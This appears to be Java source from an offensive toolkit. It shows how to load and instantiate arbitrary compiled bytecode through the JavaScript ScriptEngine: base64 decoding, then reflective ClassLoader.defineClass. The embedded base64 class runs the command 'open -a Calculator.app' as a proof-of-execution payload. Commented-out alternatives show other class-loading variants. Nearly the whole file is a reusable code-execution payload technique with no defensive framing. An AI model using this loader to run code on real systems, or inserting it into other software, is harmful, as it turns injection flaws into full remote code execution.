package org.example;

import org.ppp.tools.encryption.B64;

import javax.script.ScriptEngineManager;

/**
 * @author Whoopsunix
 */
public class ScriptEngineDemo {
    public static void main(String[] args) throws Exception {
        String b64Str = new B64().encodeJavaClass(Exec.class);
//        String b64Str = "yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY";
        defineClass(b64Str, "org.example.Exec");
    }

    // javax.script.ScriptEngineManager
    public static void defineClass(String calcBase64, String className) throws Exception {
        /**
         * //        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         * //
         * //        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         * //        defineClassMethod.setAccessible(true);
         * //        Class<?> loadedClass = (Class<?>) defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
         * //        loadedClass.newInstance();
         */
        String code = "var data=\"" + calcBase64 + "\";var bytes=java.util.Base64.getDecoder().decode(data);" +
                "var classLoader=new java.lang.ClassLoader() {};" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
                "loadedClass.newInstance();";
        code = "var data=\"" + calcBase64 + "\";\n" +
                "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "var object = aClass.newInstance();\n" +
                "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
                "var classLoader=new java.lang.ClassLoader() {};\n" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "defineClassMethod.setAccessible(true);\n" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "loadedClass.newInstance();";
        System.out.println(code);

//        String code = "var data=\"" + calcBase64 + "\";var bytes=java.util.Base64.getDecoder().decode(data);" +
//                "var classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
//                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
//                "defineClassMethod.setAccessible(true);" +
//                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
//                "loadedClass.newInstance();";

//        String code = "var data=\"" + calcBase64 + "\";var bytes=java.util.Base64.getDecoder().decode(data);" +
//                "var classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
//                "try{" +
//                "var clazz = classLoader.loadClass(\"" +className + "\");" +
//                "clazz.newInstance();" +
//                "}catch(err){" +
//                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
//                "defineClassMethod.setAccessible(true);" +
//                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
//                "loadedClass.newInstance();" +
//                "};";

        System.out.println(code);
        ScriptEngineManager.class.newInstance().getEngineByName("js").eval(code);
    }
}
